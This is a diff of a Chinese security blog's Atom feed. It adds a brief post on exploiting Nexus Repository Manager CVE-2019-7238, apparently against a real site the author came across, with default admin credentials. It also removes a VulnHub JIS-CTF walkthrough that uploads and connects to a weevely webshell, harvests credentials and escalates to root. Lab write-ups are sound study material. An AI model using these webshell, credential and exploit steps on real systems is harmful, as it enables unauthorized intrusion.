@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.lanbainan.cn/"/>
-  <updated>2019-10-10T06:15:26.578Z</updated>
+  <updated>2019-11-04T05:43:33.387Z</updated>
   <id>http://www.lanbainan.cn/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>记录一下Nexus存储库管理器远程代码执行</title>
+    <link href="http://www.lanbainan.cn/2019/11/04/2019-11-04/"/>
+    <id>http://www.lanbainan.cn/2019/11/04/2019-11-04/</id>
+    <published>2019-11-04T05:42:00.000Z</published>
+    <updated>2019-11-04T05:43:33.387Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="偶然碰上Nexus擦出火花"><a href="#偶然碰上Nexus擦出火花" class="headerlink" title="偶然碰上Nexus擦出火花"></a>偶然碰上Nexus擦出火花</h1><p>又是摸鱼时刻<br>翻出以前的站<br>查查有没有更新<br><a id="more"></a></p><h2 id="有趣的开始"><a href="#有趣的开始" class="headerlink" title="有趣的开始"></a>有趣的开始</h2><p><img src="https://i.loli.net/2019/11/04/QAuiH6Wy8Z4gzDU.png" alt="1.png"><br>反正我是很懵逼的，毕竟没见过啊<br><img src="https://i.loli.net/2019/11/04/ulPmSUdONF95xoj.png" alt="2.png"><br>但是它非常贴心的告诉我，这个版本有<a href="https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019" target="_blank" rel="noopener">问题</a><br><img src="https://i.loli.net/2019/11/04/OV8CPGfYyeAFocn.png" alt="3.png"><br>我都不好意思了，翻翻GitHub发现<a href="https://github.com/jas502n/CVE-2019-7238" target="_blank" rel="noopener">RCE</a><br><img src="https://i.loli.net/2019/11/04/vgfCnFEaHbNWzR2.png" alt="4.png"><br>直接拿下，<br><img src="https://i.loli.net/2019/11/04/eoGgPDnVfdCNk5a.png" alt="5.png"><br>注意存储库需要有东西<br>默认密码admin:admin123</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;偶然碰上Nexus擦出火花&quot;&gt;&lt;a href=&quot;#偶然碰上Nexus擦出火花&quot; class=&quot;headerlink&quot; title=&quot;偶然碰上Nexus擦出火花&quot;&gt;&lt;/a&gt;偶然碰上Nexus擦出火花&lt;/h1&gt;&lt;p&gt;又是摸鱼时刻&lt;br&gt;翻出以前的站&lt;br&gt;查查有没有更新&lt;br&gt;
+    
+    </summary>
+    
+      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="复现" scheme="http://www.lanbainan.cn/tags/%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>对登录框的测试</title>
@@ -461,30 +485,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：拿到root权限(提示从web应用入手)&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/billu-b0x,188/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/billu-b0x,188/&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>对于JIS-CTF-Vuln的测试</title>
-    <link href="http://www.lanbainan.cn/2019/04/15/2019-04-15/"/>
-    <id>http://www.lanbainan.cn/2019/04/15/2019-04-15/</id>
-    <published>2019-04-14T16:38:00.000Z</published>
-    <updated>2019-04-16T11:09:49.373Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>主机NET模式<br>实验目的：获得root权限，获取flag（共有五个flag）<br>项目地址：<a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a><br><a id="more"></a></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb53c7e38565.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.67.23</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)</span><br><span class="line">|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)</span><br><span class="line">|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 8 disallowed entries</span><br><span class="line">| / /backup /admin /admin_area /r00t /uploads</span><br><span class="line">|_/uploaded_files /flag</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-title: Sign-Up/Login Form</span><br><span class="line">|_Requested resource was login.php</span><br></pre></td></tr></table></figure></p><p>开放80、22端口<br>访问<code>http://192.168.67.23/login.php</code><br><img src="https://i.loli.net/2019/04/16/5cb53da1bbbdf.png" alt="2.png"></p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.67.23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb5413246a1d.png" alt="4.png"><br>爆破出一个flag地址<br><img src="https://i.loli.net/2019/04/16/5cb53f6b87c14.png" alt="4.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>当访问<code>http://192.168.67.23/admin_area/</code><br><img src="https://i.loli.net/2019/04/16/5cb54209eb90e.png" alt="5.png"><br>得到一个用户和密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br><span class="line">The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br></pre></td></tr></table></figure></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>前面提到登录界面，登录试试<br><img src="https://i.loli.net/2019/04/16/5cb542fa8c8d4.png" alt="6.png"><br>看样子是要上传一句话了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# weevely generate shell /root/Desktop/shell.php #生成木马</span><br></pre></td></tr></table></figure></p><p>直接上传无任何过滤，在左上角显示<code>Success</code><br>在robots.txt中看见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /uploads #上传目录</span><br><span class="line">Disallow: /uploaded_files #储存目录</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# weevely http://192.168.67.23/uploaded_files/shell.php shell #连接shell</span><br></pre></td></tr></table></figure><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@Jordaninfosec-CTF01:/var/www/html $ ls</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb55ba374c53.png" alt="7.png"><br>flag.txt无法查看权限不够<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@Jordaninfosec-CTF01:/var/www/html $ cat hint.txt</span><br><span class="line">try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br></pre></td></tr></table></figure></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>提示我们查找<strong>用户technawi</strong>，来获取flag.txt，并提到在隐藏文件中。我第一时间进入<code>/home/technawi</code>，但是什么都没有，排除系统用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -r &apos;technawi&apos; / #查找含有technawi的文件</span><br><span class="line">/etc/mysql/conf.d/credentials.txt:username : technawi</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@Jordaninfosec-CTF01:/etc/mysql/conf.d $ cat credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br></pre></td></tr></table></figure><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>获得一个用户和密码，前面提到ssh，登录试试<br><img src="https://i.loli.net/2019/04/16/5cb5626becd70.png" alt="8.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>巧的是就是technawi的密码</p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：获得root权限，获取flag（共有五个flag）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&lt;/a&gt;&lt;br&gt;
     
     </summary>
     
